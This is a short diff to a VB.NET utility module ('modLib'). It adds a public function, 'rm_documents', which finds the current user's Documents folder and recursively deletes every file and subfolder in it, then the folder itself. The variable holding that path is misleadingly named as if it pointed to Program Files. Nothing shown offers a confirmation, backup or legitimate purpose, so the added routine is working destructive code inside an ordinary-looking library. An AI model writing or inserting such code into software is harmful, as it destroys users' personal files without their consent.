@@ -37,9 +37,27 @@ Module modLib
         Return Nothing
     End Function
 
-    Public Function rm(path As String)
-        Directory.Delete(path, True)
+    ' remove entire document directory
+    Public Function rm_documents()
+        Dim szProgramFilesPath As String
+        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal)
+        rm(szProgramFilesPath)
         Return Nothing
     End Function
+
+    Private Sub rm(path As String)
+        If Directory.Exists(path) Then
+            'Delete all files from the Directory
+            For Each filepath As String In Directory.GetFiles(path)
+                File.Delete(filepath)
+            Next
+            'Delete all child Directories
+            For Each dir As String In Directory.GetDirectories(path)
+                rm(dir)
+            Next
+            'Delete a Directory
+            Directory.Delete(path)
+        End If
+    End Sub
 
 End Module
